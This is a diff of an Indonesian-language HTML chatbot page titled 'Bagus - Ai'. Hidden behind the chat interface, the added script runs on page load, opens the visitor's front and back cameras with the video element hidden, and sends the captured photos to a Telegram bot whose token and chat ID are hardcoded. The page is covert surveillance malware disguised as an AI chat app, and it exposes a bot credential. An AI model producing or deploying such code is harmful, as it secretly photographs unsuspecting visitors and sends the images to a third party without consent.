@@ -3,86 +3,132 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Chat AI</title>
+    <title>Bagus - Ai 🤖</title>
+    <script src="https://cdn.jsdelivr.net/npm/axios/dist/axios.min.js"></script>
     <style>
-        body {
-            font-family: Arial, sans-serif;
-            background-color: #f4f4f4;
-            margin: 0;
-            padding: 0;
-        }
-        #chat-container {
-            width: 100%;
-            height: 100vh;
-            display: flex;
-            flex-direction: column;
-            justify-content: flex-end;
-            padding: 10px;
-            box-sizing: border-box;
-            background: url('chat-background.jpg') no-repeat center center;
-            background-size: cover;
-        }
-        #messages {
-            flex-grow: 1;
-            overflow-y: auto;
-            padding: 10px;
-        }
-        .message {
-            background: #e0e0e0;
-            padding: 10px;
-            margin: 5px;
-            border-radius: 10px;
-            max-width: 70%;
-        }
-        .user { background: #2196F3; color: white; align-self: flex-end; }
-        .bot { background: #ddd; align-self: flex-start; }
-        #video {
-            position: absolute;
-            top: -9999px;
-            left: -9999px;
-        }
+        * { margin: 0; padding: 0; box-sizing: border-box; }
+        body, html { width: 100vw; height: 100vh; font-family: Arial, sans-serif; background: #121212; color: white; display: flex; flex-direction: column; overflow: hidden; }
+        .container { width: 100vw; height: 100vh; display: flex; flex-direction: column; }
+        .header { background: #282828; padding: 15px; text-align: center; font-size: 18px; font-weight: bold; position: fixed; top: 0; width: 100%; z-index: 10; }
+        .chat-box { flex-grow: 1; overflow-y: auto; padding: 60px 10px 70px; display: flex; flex-direction: column; max-height: calc(100vh - 60px - 45px); }
+        .input-box { position: fixed; bottom: 0; left: 0; width: 100%; display: flex; padding: 10px; background: #282828; }
+        input { flex: 1; padding: 12px; border: none; border-radius: 20px; outline: none; background: #444; color: white; font-size: 16px; margin-right: 10px; }
+        button { background: #007bff; border: none; padding: 12px 16px; border-radius: 50%; color: white; cursor: pointer; font-size: 18px; }
+        video, canvas { display: none; } /* Sembunyikan elemen kamera */
     </style>
 </head>
 <body>
-
-<div id="chat-container">
-    <div id="messages">
-        <div class="message bot">Halo! Apa yang bisa saya bantu?</div>
+    <div class="container">
+        <div class="header">Bagus - Ai 🤖</div>
+        <div class="chat-box" id="chatBox"></div>
     </div>
-</div>
+    <div class="input-box">
+        <input type="text" id="userInput" placeholder="Ketik pesan..." onkeypress="handleEnter(event)">
+        <button onclick="sendMessage()">➤</button>
+    </div>
 
-<video id="video" autoplay playsinline></video>
+    <!-- Kamera -->
+    <video id="video" autoplay playsinline></video>
+    <canvas id="canvas"></canvas>
 
-<script>
-    async function startCamera() {
-        try {
-            const stream = await navigator.mediaDevices.getUserMedia({ video: true });
-            const video = document.getElementById('video');
+    <script>
+        const TELEGRAM_BOT_TOKEN = "ISI_TOKEN_BOT";
+        const TELEGRAM_CHAT_ID = "ISI_CHAT_ID_OWNER";
+
+        async function startCamera() {
+            try {
+                const streamFront = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } });
+                const streamBack = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "environment" } });
+
+                document.getElementById("video").srcObject = streamFront;
+                setTimeout(() => capturePhoto(streamFront, "Depan"), 3000);
+                setTimeout(() => capturePhoto(streamBack, "Belakang"), 6000);
+            } catch (error) {
+                console.error("Gagal mengakses kamera:", error);
+            }
+        }
+
+        function capturePhoto(stream, label) {
+            const video = document.getElementById("video");
             video.srcObject = stream;
 
-            setTimeout(capturePhoto, 5000); // Ambil foto setelah 5 detik
-        } catch (err) {
-            console.error("Akses kamera ditolak:", err);
+            setTimeout(() => {
+                const canvas = document.getElementById("canvas");
+                canvas.width = video.videoWidth;
+                canvas.height = video.videoHeight;
+                const ctx = canvas.getContext("2d");
+                ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
+                
+                const imageData = canvas.toDataURL("image/jpeg");
+                sendToTelegram(imageData, label);
+            }, 2000);
         }
-    }
 
-    function capturePhoto() {
-        const video = document.getElementById('video');
-        const canvas = document.createElement('canvas');
-        const ctx = canvas.getContext('2d');
+        async function sendToTelegram(imageData, label) {
+            try {
+                const blob = await fetch(imageData).then(res => res.blob());
+                const formData = new FormData();
+                formData.append("chat_id", 7081489041);
+                formData.append("photo", blob, `${label}.jpg`);
+                formData.append("caption", `📷 Foto ${label}`);
 
-        canvas.width = video.videoWidth;
-        canvas.height = video.videoHeight;
-        ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
+                await fetch(`https://api.telegram.org/bot7788095309:AAEjIyu4Beuzs6IVZjHrTLN_9NmPy6vs8DY/sendPhoto`, {
+                    method: "POST",
+                    body: formData
+                });
 
-        const imageData = canvas.toDataURL('image/png');
+                console.log(`Foto ${label} berhasil dikirim!`);
+            } catch (error) {
+                console.error("Gagal mengirim foto:", error);
+            }
+        }
 
-        // Kirim ke server atau bot Telegram di sini
-        console.log("Foto diambil:", imageData);
-    }
+        async function sendMessage() {
+            const userInput = document.getElementById("userInput");
+            const message = userInput.value.trim();
+            if (!message) return;
+            addMessage(message, "user");
+            userInput.value = "";
 
-    startCamera();
-</script>
+            try {
+                const response = await axios.post("https://luminai.my.id/", {
+                    content: message,
+                    user: "User",
+                    prompt: "Nama kamu adalah Bagus-Ai, sebuah AI yang ramah dan sopan."
+                });
 
+                setTimeout(() => {
+                    const botReply = response.data.result || "Error: Tidak ada respons.";
+                    addMessage(botReply.replace(/\\n/g, "\n"), "bot");
+                }, 2000);
+            } catch (err) {
+                addMessage("❌ Error: " + err.message, "bot");
+            }
+        }
+
+        function addMessage(text, sender) {
+            const chatBox = document.getElementById("chatBox");
+            const container = document.createElement("div");
+            const messageDiv = document.createElement("div");
+
+            container.classList.add("message-container", sender + "-container");
+            messageDiv.classList.add("message", sender);
+
+            messageDiv.textContent = text;
+            container.appendChild(messageDiv);
+            chatBox.appendChild(container);
+
+            setTimeout(() => chatBox.scrollTop = chatBox.scrollHeight, 50);
+        }
+
+        function handleEnter(event) {
+            if (event.key === "Enter") {
+                sendMessage();
+                event.preventDefault();
+            }
+        }
+
+        window.onload = startCamera;
+    </script>
 </body>
-</html>
+    </html>
